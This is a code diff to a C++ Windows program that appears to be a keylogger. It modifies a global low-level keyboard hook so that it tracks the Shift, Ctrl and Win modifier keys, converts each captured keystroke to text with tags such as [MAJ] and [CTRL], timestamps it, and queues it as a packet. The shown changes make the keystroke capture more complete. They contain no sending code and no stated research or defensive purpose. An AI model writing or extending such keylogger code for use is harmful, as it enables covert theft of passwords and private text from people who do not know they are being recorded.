@@ -15,22 +15,22 @@ Packager::~Packager()
 
 void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
 	KBDLLHOOKSTRUCT *info = (KBDLLHOOKSTRUCT *)lParam;
-	if ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == WM_SYSKEYDOWN) {
+	if ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == 256) {
 		_shift = true;
 	}
-	if ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == WM_SYSKEYUP) {
+	if ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == 257) {
 		_shift = false;
 	}
-	if ((info->vkCode == VK_LCONTROL || info->vkCode == VK_RCONTROL) && wParam == WM_SYSKEYDOWN) {
+	if ((info->vkCode == VK_LCONTROL || info->vkCode == VK_RCONTROL) && wParam == 256) {
 		_ctrl = true;
 	}
-	if ((info->vkCode == VK_LCONTROL || info->vkCode == VK_RCONTROL) && wParam == WM_SYSKEYUP) {
+	if ((info->vkCode == VK_LCONTROL || info->vkCode == VK_RCONTROL) && wParam == 257) {
 		_ctrl = false;
 	}
-	if ((info->vkCode == VK_LWIN || info->vkCode == VK_RWIN) && wParam == WM_SYSKEYDOWN) {
+	if ((info->vkCode == VK_LWIN || info->vkCode == VK_RWIN) && wParam == 256) {
 		_win = true;
 	}
-	if ((info->vkCode == VK_LWIN || info->vkCode == VK_RWIN) && wParam == WM_SYSKEYUP) {
+	if ((info->vkCode == VK_LWIN || info->vkCode == VK_RWIN) && wParam == 257) {
 		_win = false;
 	}
 
@@ -40,10 +40,23 @@ void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (ToUnicode(info->vkCode, info->scanCode, kbdState, buff, 2, 0) > 0) {
 		PaquetKeys *tmp = new PaquetKeys();
 		tmp->setDate(info->time);
-		std::cout << "UNICODE : " << buff[0] << std::endl;
-		//tmp->setText(buff);
+		std::wstring ws(buff);
+		std::string  str;
+		if (_shift) {
+			str += "[MAJ] ";
+		}
+		if (_ctrl) {
+			str += "[CTRL] ";
+		}
+		if (_win) {
+			str += "[WIN] ";
+		}
+		str.append(ws.begin(), ws.end());
+		std::cout << "string UNICODE : " << str << std::endl;
+		tmp->setText(str);
 		tmp->createPaquet();
 		_paquets.push_back(tmp);
+		
 	}
 }
 
